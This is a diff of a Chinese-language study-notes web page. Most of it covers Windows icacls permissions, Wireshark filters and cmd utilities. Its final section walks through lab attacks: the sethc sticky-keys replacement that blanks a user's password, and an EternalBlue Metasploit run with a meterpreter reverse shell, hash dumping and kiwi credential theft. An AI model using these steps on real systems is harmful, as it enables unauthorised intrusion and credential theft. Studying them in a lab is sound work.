+icacls &quot;C:\Data&quot; /remove &quot;Everyone&quot;
+
+## <span class="hljs-number">3</span>、继承权限
+# 禁用继承并移除继承权限：目录将不再继承父目录权限，并删除所有已继承的权限条目。
+icacls &quot;C:\Data&quot; /inheritance:r
+# 禁用继承但保留权限：恢复继承父目录权限的设置。
+icacls &quot;C:\Data&quot; /inheritance:d
+
+## <span class="hljs-number">4</span>、备份与恢复权限
+# 备份 ACL 到文件：将目录及其子项的 ACL 保存到文本文件，供后续恢复使用。
+icacls &quot;C:\Data&quot; /save &quot;C:\Backup\Data_ACL.txt&quot; /T
+# 从文件恢复 ACL：恢复目录及其子项的 ACL 为备份时的状态。
+icacls &quot;C:\Data&quot; /<span class="hljs-built_in">restore</span> &quot;C:\Backup\Data_ACL.txt&quot;
+
+## <span class="hljs-number">5</span>、重置权限为默认继承
+# 删除所有显式设置的权限，恢复为父目录的继承设置（慎用，可能导致权限丢失）。
+icacls &quot;C:\Data&quot; /reset /T
+
+## 典型应用&#123;&quot;OI,CI&quot;: &quot;影响未来子文件和目录&quot;, &quot;RWD&quot;: &quot;不可以执行和修改权限其他都可&quot;, &quot;/T&quot;: &quot;需要递归现存的子孙文件和目录&quot;&#125;
+icacls &quot;public&quot; /inheritance:r /grant &quot;owner&quot;:(OI)(CI)(F) /grant &quot;admin&quot;:(OI)(CI)(M|[RX,W,D]) /grant &quot;group_rwd&quot;:(OI)(CI)(R,W,D) /grant &quot;group_rx&quot;:(OI)(CI)(RX) /grant &quot;group_r&quot;:(OI)(CI)(R) /T
+language-bat复制代码</code></pre>
 
 <h3 id="权限掩码说明"><a href="#权限掩码说明" class="headerlink" title="权限掩码说明"></a><strong>权限掩码说明</strong></h3><table>
 <thead>
@@ -1120,15 +1244,87 @@
 </tbody></table>
 <h2 id="Wireshark-抓包工具"><a href="#Wireshark-抓包工具" class="headerlink" title="Wireshark 抓包工具"></a>Wireshark 抓包工具</h2><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250829114043399.png" alt="抓包"></p>
 <p>抓包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1: 开始抓包</span><br><span class="line">2: 停止抓包</span><br><span class="line">3: 重新抓包</span><br><span class="line">4：捕获过滤器：抓包前设置</span><br><span class="line"></span><br><span class="line">16: 着色规则</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">显示过滤器: 分析 &gt; 显示过滤器。可以添加过滤条件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">1: 开始抓包
+2: 停止抓包
+3: 重新抓包
+4：捕获过滤器：抓包前设置
 
-<h3 id="过滤使用"><a href="#过滤使用" class="headerlink" title="过滤使用"></a>过滤使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ip.addr==10.10.11.148</span><br><span class="line">tpc</span><br><span class="line">udp</span><br><span class="line">http</span><br><span class="line"></span><br><span class="line"><span class="comment">## 捕获过滤器 (抓包前，输入的条件要是绿色才可以)</span></span><br><span class="line">ip host 192.168.16.100 and icmp</span><br><span class="line"><span class="comment"># 协议</span></span><br><span class="line">tcp</span><br><span class="line">icmp</span><br><span class="line"><span class="comment"># ip 过滤</span></span><br><span class="line">host 192.168.16.100 <span class="comment"># 源目的</span></span><br><span class="line">src host 192.168.16.100 <span class="comment"># 源</span></span><br><span class="line">dst host 192.168.16.100 <span class="comment"># 目的</span></span><br><span class="line"><span class="comment"># port 过滤</span></span><br><span class="line">port 443</span><br><span class="line">src port 443</span><br><span class="line">dst port 443</span><br><span class="line"><span class="comment"># 一起使用</span></span><br><span class="line"><span class="comment"># and | &amp;&amp; 两个参数都可以</span></span><br><span class="line"><span class="comment"># or | ||</span></span><br><span class="line"><span class="comment"># !</span></span><br><span class="line">src host 192.168.16.100 &amp;&amp; dst port 443</span><br><span class="line">!broadcast <span class="comment"># 非广播</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 搜索栏过滤</span></span><br><span class="line">icmp</span><br><span class="line"><span class="comment"># ip</span></span><br><span class="line">ip.addr==192.168.16.100</span><br><span class="line">ip.src==192.168.16.100</span><br><span class="line">ip.dst==192.168.16.100</span><br><span class="line">tcp.port==443</span><br><span class="line">udp.port=443</span><br><span class="line">tcp.srcport=443</span><br><span class="line">tcp.dstport=443</span><br><span class="line"><span class="comment"># 方法</span></span><br><span class="line">http.request.method==GET</span><br><span class="line">http.request.method==POST</span><br><span class="line">ip.addr==192.168.16.100 and icmp</span><br><span class="line">ip.addr==192.168.16.100 or icmp</span><br><span class="line"></span><br><span class="line"><span class="comment">## 将抓包内容作为过滤条件应用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+16: 着色规则
 
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cls</span> # 清屏</span><br><span class="line"><span class="built_in">ver</span> # 查看当前dos版本</span><br><span class="line"><span class="built_in">chkdsk</span> # 检查当前磁盘，<span class="built_in">chkdsk</span> d: 检查D盘</span><br><span class="line"><span class="built_in">time</span> # 显示时间</span><br><span class="line"><span class="built_in">date</span> # 显示日期</span><br><span class="line">certmgr # 证书管理窗口</span><br><span class="line">mstsc # 打开远程窗口</span><br><span class="line">explorer # 文件管理器</span><br><span class="line">calc # 计时器工具</span><br><span class="line">cleanmgr # 磁盘清理工具</span><br><span class="line">gpedit # 本地组策略编辑器</span><br><span class="line">lusrmgr # 本地用户和组</span><br><span class="line">notepad # 打开记事本</span><br><span class="line">regedit # 注册表</span><br><span class="line">sfc # 检查文件， sfc /SCANNOW </span><br><span class="line">taskmgr # 任务管理器</span><br><span class="line">write # 写字板</span><br><span class="line"><span class="built_in">help</span> = command /? # 查看有什么命令</span><br><span class="line"><span class="built_in">color</span> <span class="number">0</span>a # 修改<span class="built_in">cmd</span>窗口颜色</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<span class="hljs-comment"># </span>
+显示过滤器: 分析 &gt; 显示过滤器。可以添加过滤条件
+</code></pre>
+
+<h3 id="过滤使用"><a href="#过滤使用" class="headerlink" title="过滤使用"></a>过滤使用</h3><pre><code class="hljs bash">ip.addr==10.10.11.148
+tpc
+udp
+http
+
+<span class="hljs-comment">## 捕获过滤器 (抓包前，输入的条件要是绿色才可以)</span>
+ip host 192.168.16.100 and icmp
+<span class="hljs-comment"># 协议</span>
+tcp
+icmp
+<span class="hljs-comment"># ip 过滤</span>
+host 192.168.16.100 <span class="hljs-comment"># 源目的</span>
+src host 192.168.16.100 <span class="hljs-comment"># 源</span>
+dst host 192.168.16.100 <span class="hljs-comment"># 目的</span>
+<span class="hljs-comment"># port 过滤</span>
+port 443
+src port 443
+dst port 443
+<span class="hljs-comment"># 一起使用</span>
+<span class="hljs-comment"># and | &amp;&amp; 两个参数都可以</span>
+<span class="hljs-comment"># or | ||</span>
+<span class="hljs-comment"># !</span>
+src host 192.168.16.100 &amp;&amp; dst port 443
+!broadcast <span class="hljs-comment"># 非广播</span>
+
+<span class="hljs-comment">## 搜索栏过滤</span>
+icmp
+<span class="hljs-comment"># ip</span>
+ip.addr==192.168.16.100
+ip.src==192.168.16.100
+ip.dst==192.168.16.100
+tcp.port==443
+udp.port=443
+tcp.srcport=443
+tcp.dstport=443
+<span class="hljs-comment"># 方法</span>
+http.request.method==GET
+http.request.method==POST
+ip.addr==192.168.16.100 and icmp
+ip.addr==192.168.16.100 or icmp
+
+<span class="hljs-comment">## 将抓包内容作为过滤条件应用</span>
+</code></pre>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><pre><code class="hljs bat"><span class="hljs-built_in">cls</span> # 清屏
+<span class="hljs-built_in">ver</span> # 查看当前dos版本
+<span class="hljs-built_in">chkdsk</span> # 检查当前磁盘，<span class="hljs-built_in">chkdsk</span> d: 检查D盘
+<span class="hljs-built_in">time</span> # 显示时间
+<span class="hljs-built_in">date</span> # 显示日期
+certmgr # 证书管理窗口
+mstsc # 打开远程窗口
+explorer # 文件管理器
+calc # 计时器工具
+cleanmgr # 磁盘清理工具
+gpedit # 本地组策略编辑器
+lusrmgr # 本地用户和组
+notepad # 打开记事本
+regedit # 注册表
+sfc # 检查文件， sfc /SCANNOW 
+taskmgr # 任务管理器
+write # 写字板
+<span class="hljs-built_in">help</span> = command /? # 查看有什么命令
+<span class="hljs-built_in">color</span> <span class="hljs-number">0</span>a # 修改<span class="hljs-built_in">cmd</span>窗口颜色
+language-bat复制代码</code></pre>
 
 <hr>
 <h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><hr>
-<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="0001-5次shift漏洞"><a href="#0001-5次shift漏洞" class="headerlink" title="0001 5次shift漏洞"></a>0001 5次shift漏洞</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 唤醒程序路径：C:\Windows\System32\sethc</span></span><br><span class="line"><span class="comment"># 复现方法：先关机重启，看到windows图标，直接在VM上关闭客户机（模拟开机时断断电源操作），再重启虚拟机，一定要看到“启动启动修复（推荐）”，回车；取消还原，查看“隐藏问题详细信息”，打开“X:\windows\system32\zh-CN\erofflps.txt”，在记事本中文件&gt;打开，文件类型选择所有文件，将sethc修改为sethce，将cmd复制一份并修改为sethc，之后关闭窗口点击完成关机，再开机，点击用户登陆，按5次shift按键，在CMD窗口执行net user username &quot;&quot;，设置无密码即可登录。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><h2 id="0001-5次shift漏洞"><a href="#0001-5次shift漏洞" class="headerlink" title="0001 5次shift漏洞"></a>0001 5次shift漏洞</h2><pre><code class="hljs bash"><span class="hljs-comment"># 唤醒程序路径：C:\Windows\System32\sethc</span>
+<span class="hljs-comment"># 复现方法：先关机重启，看到windows图标，直接在VM上关闭客户机（模拟开机时断断电源操作），再重启虚拟机，一定要看到“启动启动修复（推荐）”，回车；取消还原，查看“隐藏问题详细信息”，打开“X:\windows\system32\zh-CN\erofflps.txt”，在记事本中文件&gt;打开，文件类型选择所有文件，将sethc修改为sethce，将cmd复制一份并修改为sethc，之后关闭窗口点击完成关机，再开机，点击用户登陆，按5次shift按键，在CMD窗口执行net user username &quot;&quot;，设置无密码即可登录。</span>
+</code></pre>
 
 
 
@@ -1136,7 +1332,35 @@
 <p>sethc</p>
 <p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250823114952907.png" alt="5次shift漏洞"></p>
 <p>5次shift漏洞</p>
-<h2 id="0002-永恒之蓝"><a href="#0002-永恒之蓝" class="headerlink" title="0002 永恒之蓝"></a>0002 永恒之蓝</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sS -p 445 192.168.112.0/24 &gt; p_445</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> p_445 | grep -E <span class="string">&quot;Nmap|open&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">msfconsole</span><br><span class="line">  search ms17_010</span><br><span class="line">  use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">  use exploit/windows/smb/ms17_010_eternalblue\</span><br><span class="line">    <span class="built_in">set</span> rhost 192.168.112.128 <span class="comment"># 设置靶机</span></span><br><span class="line">    <span class="built_in">set</span> lhost 192.168.112.130 <span class="comment"># 设置本机IP</span></span><br><span class="line">    <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">    run <span class="comment"># 开始攻击</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 攻击成功后的操作</span></span><br><span class="line">screenshot <span class="comment"># 截图</span></span><br><span class="line">screenshare <span class="comment"># 实时监控屏幕</span></span><br><span class="line"><span class="comment"># 查看密码</span></span><br><span class="line">hashdump</span><br><span class="line">load kiwi</span><br><span class="line">ps -S <span class="string">&quot;csrss&quot;</span></span><br><span class="line">migrate 344</span><br><span class="line">creds_all</span><br><span class="line">shell <span class="comment"># 登陆到win7</span></span><br><span class="line">chcp 65001 <span class="comment"># 消除乱码</span></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1 <span class="comment"># 远程</span></span><br><span class="line">netstat -an <span class="comment"># 查看端口</span></span><br><span class="line"><span class="built_in">sudo</span> rdesktop 192.168.112.128 <span class="comment"># 发起远程</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="0002-永恒之蓝"><a href="#0002-永恒之蓝" class="headerlink" title="0002 永恒之蓝"></a>0002 永恒之蓝</h2><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nmap -sS -p 445 192.168.112.0/24 &gt; p_445
+
+<span class="hljs-built_in">cat</span> p_445 | grep -E <span class="hljs-string">&quot;Nmap|open&quot;</span>
+
+<span class="hljs-comment"># </span>
+msfconsole
+  search ms17_010
+  use auxiliary/scanner/smb/smb_ms17_010
+  use exploit/windows/smb/ms17_010_eternalblue\
+    <span class="hljs-built_in">set</span> rhost 192.168.112.128 <span class="hljs-comment"># 设置靶机</span>
+    <span class="hljs-built_in">set</span> lhost 192.168.112.130 <span class="hljs-comment"># 设置本机IP</span>
+    <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp
+    run <span class="hljs-comment"># 开始攻击</span>
+
+<span class="hljs-comment">## 攻击成功后的操作</span>
+screenshot <span class="hljs-comment"># 截图</span>
+screenshare <span class="hljs-comment"># 实时监控屏幕</span>
+<span class="hljs-comment"># 查看密码</span>
+hashdump
+load kiwi
+ps -S <span class="hljs-string">&quot;csrss&quot;</span>
+migrate 344
+creds_all
+shell <span class="hljs-comment"># 登陆到win7</span>
+chcp 65001 <span class="hljs-comment"># 消除乱码</span>
+wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1 <span class="hljs-comment"># 远程</span>
+netstat -an <span class="hljs-comment"># 查看端口</span>
+<span class="hljs-built_in">sudo</span> rdesktop 192.168.112.128 <span class="hljs-comment"># 发起远程</span>
+</code></pre>
 
 <hr>
 
